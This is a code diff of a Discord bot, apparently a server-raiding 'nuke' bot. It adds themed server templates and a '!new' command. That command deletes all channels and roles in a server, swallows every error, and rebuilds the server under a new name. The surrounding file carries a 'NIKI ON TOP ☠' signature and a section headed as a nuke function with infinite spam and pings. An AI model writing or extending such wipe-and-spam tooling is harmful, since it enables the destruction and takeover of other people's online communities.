@@ -9,10 +9,10 @@ const {
     ActionRowBuilder, 
     ButtonBuilder, 
     ButtonStyle,
-    StringSelectMenuBuilder, // NOUVEAU
-    ModalBuilder,            // NOUVEAU
-    TextInputBuilder,        // NOUVEAU
-    TextInputStyle           // NOUVEAU
+    StringSelectMenuBuilder,
+    ModalBuilder,
+    TextInputBuilder,
+    TextInputStyle
 } = require('discord.js');
 
 // ============================================================
@@ -150,6 +150,144 @@ const SCARY_NAMES = [
 const inviteLink = 'https://discord.gg/eVTU7sW3wv';
 
 // ============================================================
+// SERVER TEMPLATES (PROPRES - SANS NSFW)
+// ============================================================
+const TEMPLATES = {
+    anime: {
+        name: '🎌 Anime Paradise',
+        channels: [
+            { name: '📢-annonces', type: 'text', category: 'Informations' },
+            { name: '👋-bienvenue', type: 'text', category: 'Informations' },
+            { name: '📋-regles', type: 'text', category: 'Informations' },
+            { name: '💬-chat-general', type: 'text', category: 'Discussion' },
+            { name: '🎨-fan-art', type: 'text', category: 'Discussion' },
+            { name: '📺-anime-discussion', type: 'text', category: 'Discussion' },
+            { name: '📖-manga-discussion', type: 'text', category: 'Discussion' },
+            { name: '🎵-anime-music', type: 'text', category: 'Discussion' },
+            { name: '🛒-merchandise', type: 'text', category: 'Discussion' },
+            { name: '🎮-anime-games', type: 'text', category: 'Discussion' },
+            { name: '📝-suggestions', type: 'text', category: 'Discussion' },
+            { name: '🔊-vocal-general', type: 'voice', category: 'Vocaux' },
+            { name: '🎤-karaoke', type: 'voice', category: 'Vocaux' }
+        ],
+        categories: ['Informations', 'Discussion', 'Vocaux'],
+        roles: [
+            { name: '👑 Propriétaire', color: '#FF0000' },
+            { name: '⭐ Administrateur', color: '#FFA500' },
+            { name: '🛡️ Modérateur', color: '#00FF00' },
+            { name: '🎌 Fan d\'anime', color: '#FF69B4' },
+            { name: '📖 Lecteur de manga', color: '#8B4513' },
+            { name: '🎨 Artiste', color: '#800080' },
+            { name: '🎵 Musicien', color: '#1E90FF' }
+        ],
+        icon: 'https://i.imgur.com/4YqVp8M.png'
+    },
+    gaming: {
+        name: '🎮 Gaming Empire',
+        channels: [
+            { name: '📢-annonces', type: 'text', category: 'Informations' },
+            { name: '👋-bienvenue', type: 'text', category: 'Informations' },
+            { name: '📋-regles', type: 'text', category: 'Informations' },
+            { name: '💬-chat-gaming', type: 'text', category: 'Discussion' },
+            { name: '🎮-discussions-jeux', type: 'text', category: 'Discussion' },
+            { name: '📺-streaming', type: 'text', category: 'Discussion' },
+            { name: '🎯-tournois', type: 'text', category: 'Discussion' },
+            { name: '🛒-offres-jeux', type: 'text', category: 'Discussion' },
+            { name: '🎵-musique-gaming', type: 'text', category: 'Discussion' },
+            { name: '📝-suggestions', type: 'text', category: 'Discussion' },
+            { name: '🔊-vocal-gaming', type: 'voice', category: 'Vocaux' },
+            { name: '🎤-team-speak', type: 'voice', category: 'Vocaux' }
+        ],
+        categories: ['Informations', 'Discussion', 'Vocaux'],
+        roles: [
+            { name: '👑 Propriétaire', color: '#FF0000' },
+            { name: '⭐ Administrateur', color: '#FFA500' },
+            { name: '🛡️ Modérateur', color: '#00FF00' },
+            { name: '🎮 Gamer', color: '#32CD32' },
+            { name: '📺 Streamer', color: '#1E90FF' },
+            { name: '🏆 Pro Player', color: '#FFD700' }
+        ],
+        icon: 'https://i.imgur.com/2wI8t0V.png'
+    },
+    music: {
+        name: '🎵 Music World',
+        channels: [
+            { name: '📢-annonces', type: 'text', category: 'Informations' },
+            { name: '👋-bienvenue', type: 'text', category: 'Informations' },
+            { name: '📋-regles', type: 'text', category: 'Informations' },
+            { name: '💬-chat-musical', type: 'text', category: 'Discussion' },
+            { name: '🎵-demandes-chansons', type: 'text', category: 'Discussion' },
+            { name: '📺-clips-musicaux', type: 'text', category: 'Discussion' },
+            { name: '🎤-chant', type: 'text', category: 'Discussion' },
+            { name: '🛒-merchandise', type: 'text', category: 'Discussion' },
+            { name: '📝-suggestions', type: 'text', category: 'Discussion' },
+            { name: '🔊-vocal-musical', type: 'voice', category: 'Vocaux' },
+            { name: '🎤-karaoke', type: 'voice', category: 'Vocaux' }
+        ],
+        categories: ['Informations', 'Discussion', 'Vocaux'],
+        roles: [
+            { name: '👑 Propriétaire', color: '#FF0000' },
+            { name: '⭐ Administrateur', color: '#FFA500' },
+            { name: '🛡️ Modérateur', color: '#00FF00' },
+            { name: '🎵 Amateur de musique', color: '#1E90FF' },
+            { name: '🎤 Chanteur', color: '#FF69B4' },
+            { name: '🎶 DJ', color: '#8B4513' }
+        ],
+        icon: 'https://i.imgur.com/3hqP4G6.png'
+    },
+    tech: {
+        name: '💻 Tech Hub',
+        channels: [
+            { name: '📢-annonces', type: 'text', category: 'Informations' },
+            { name: '👋-bienvenue', type: 'text', category: 'Informations' },
+            { name: '📋-regles', type: 'text', category: 'Informations' },
+            { name: '💬-chat-tech', type: 'text', category: 'Discussion' },
+            { name: '💻-programmation', type: 'text', category: 'Discussion' },
+            { name: '🔧-hardware', type: 'text', category: 'Discussion' },
+            { name: '📱-mobile', type: 'text', category: 'Discussion' },
+            { name: '🛒-offres-tech', type: 'text', category: 'Discussion' },
+            { name: '📝-suggestions', type: 'text', category: 'Discussion' },
+            { name: '🔊-vocal-tech', type: 'voice', category: 'Vocaux' }
+        ],
+        categories: ['Informations', 'Discussion', 'Vocaux'],
+        roles: [
+            { name: '👑 Propriétaire', color: '#FF0000' },
+            { name: '⭐ Administrateur', color: '#FFA500' },
+            { name: '🛡️ Modérateur', color: '#00FF00' },
+            { name: '💻 Développeur', color: '#1E90FF' },
+            { name: '🔧 Expert Hardware', color: '#8B4513' },
+            { name: '📱 Pro Mobile', color: '#32CD32' }
+        ],
+        icon: 'https://i.imgur.com/5VjN7pK.png'
+    },
+    school: {
+        name: '📚 School Zone',
+        channels: [
+            { name: '📢-annonces', type: 'text', category: 'Informations' },
+            { name: '👋-bienvenue', type: 'text', category: 'Informations' },
+            { name: '📋-regles', type: 'text', category: 'Informations' },
+            { name: '💬-chat-general', type: 'text', category: 'Discussion' },
+            { name: '📖-groupes-etude', type: 'text', category: 'Discussion' },
+            { name: '📝-aide-devoirs', type: 'text', category: 'Discussion' },
+            { name: '🎓-preparation-univ', type: 'text', category: 'Discussion' },
+            { name: '📚-club-lecture', type: 'text', category: 'Discussion' },
+            { name: '📝-suggestions', type: 'text', category: 'Discussion' },
+            { name: '🔊-vocal-etude', type: 'voice', category: 'Vocaux' }
+        ],
+        categories: ['Informations', 'Discussion', 'Vocaux'],
+        roles: [
+            { name: '👑 Propriétaire', color: '#FF0000' },
+            { name: '⭐ Administrateur', color: '#FFA500' },
+            { name: '🛡️ Modérateur', color: '#00FF00' },
+            { name: '📖 Étudiant', color: '#1E90FF' },
+            { name: '🎓 Enseignant', color: '#8B4513' },
+            { name: '📚 Bibliophile', color: '#FF69B4' }
+        ],
+        icon: 'https://i.imgur.com/8XqVp7M.png'
+    }
+};
+
+// ============================================================
 // UPDATE STATS CHANNEL
 // ============================================================
 async function updateStatsChannel() {
@@ -266,7 +404,147 @@ client.on('messageCreate', async (message) => {
         await updateStatsChannel();
         await message.reply('✅ Stats channel set!');
     }
+
+    if (command === 'new') {
+        const theme = args[0]?.toLowerCase();
+        if (!theme || !TEMPLATES[theme]) {
+            const available = Object.keys(TEMPLATES).join(', ');
+            return message.reply(`❌ Available themes: ${available}\nUsage: !new <theme>`);
+        }
+        await handleNewServer(message, theme);
+    }
 });
+
+// ============================================================
+// NEW SERVER COMMAND (PROPRE - SANS NSFW)
+// ============================================================
+async function handleNewServer(message, theme) {
+    if (message.author.id !== AUTHORIZED_ID) {
+        return message.reply('❌ You are not authorized to use this command!');
+    }
+
+    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return message.reply('❌ You need administrator permissions!');
+    }
+
+    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return message.reply('❌ I need administrator permissions!');
+    }
+
+    const template = TEMPLATES[theme];
+    await message.reply(`🎨 Creating **${template.name}** server...`);
+
+    const guild = message.guild;
+
+    try {
+        // Delete all existing channels
+        const channels = guild.channels.cache;
+        for (const [id, channel] of channels) {
+            try { await channel.delete(); } catch (e) {}
+        }
+
+        // Delete all roles (except @everyone)
+        const roles = guild.roles.cache;
+        for (const [id, role] of roles) {
+            if (role.name !== '@everyone') {
+                try { await role.delete(); } catch (e) {}
+            }
+        }
+
+        // Create categories
+        const categoryMap = {};
+        for (const catName of template.categories) {
+            try {
+                const cat = await guild.channels.create({
+                    name: catName,
+                    type: ChannelType.GuildCategory,
+                });
+                categoryMap[catName] = cat;
+            } catch (e) {}
+        }
+
+        // Create new channels with proper permissions
+        const memberRole = await guild.roles.create({
+            name: 'Membre',
+            color: '#00FF00',
+            hoist: true
+        });
+
+        for (const channelData of template.channels) {
+            try {
+                const type = channelData.type === 'voice' ? ChannelType.GuildVoice : ChannelType.GuildText;
+                const parent = categoryMap[channelData.category] || null;
+                const channel = await guild.channels.create({
+                    name: channelData.name,
+                    type: type,
+                    parent: parent,
+                    permissionOverwrites: [
+                        {
+                            id: guild.roles.everyone,
+                            deny: [PermissionsBitField.Flags.ViewChannel],
+                        },
+                        {
+                            id: memberRole,
+                            allow: [PermissionsBitField.Flags.ViewChannel],
+                        }
+                    ]
+                });
+
+                // Si c'est un salon textuel, on peut ajouter une description
+                if (type === ChannelType.GuildText) {
+                    try {
+                        await channel.send(`**Bienvenue dans ${channelData.name} !**\nCe salon est dédié à la discussion sur ${channelData.name}.`);
+                    } catch (e) {}
+                }
+            } catch (e) {}
+        }
+
+        // Create new roles
+        for (const roleData of template.roles) {
+            try {
+                await guild.roles.create({
+                    name: roleData.name,
+                    color: roleData.color,
+                    hoist: true,
+                    mentionable: true
+                });
+            } catch (e) {}
+        }
+
+        // Rename server
+        try {
+            await guild.setName(template.name);
+        } catch (e) {}
+
+        // Set server icon (if image URL provided)
+        try {
+            if (template.icon) {
+                const response = await fetch(template.icon);
+                const buffer = await response.arrayBuffer();
+                await guild.setIcon(Buffer.from(buffer));
+            }
+        } catch (e) {}
+
+        const embed = new EmbedBuilder()
+            .setColor(0x00FF00)
+            .setTitle('✅ Server Created!')
+            .setDescription(`**Theme:** ${template.name}`)
+            .addFields(
+                { name: '📝 Channels', value: `${template.channels.length} created`, inline: true },
+                { name: '🎭 Roles', value: `${template.roles.length} created`, inline: true },
+                { name: '📂 Categories', value: `${template.categories.length} created`, inline: true },
+                { name: '👤 Authorized User', value: `<@${AUTHORIZED_ID}>`, inline: true }
+            )
+            .setFooter({ text: 'NIKI ON TOP ☠' })
+            .setTimestamp();
+
+        await message.channel.send({ embeds: [embed] });
+
+    } catch (error) {
+        console.error(error);
+        await message.channel.send('❌ Error creating server: ' + error.message);
+    }
+}
 
 // ============================================================
 // NUKE FUNCTION (AVEC SPAM INFINI + PING + RÔLE NIKI)
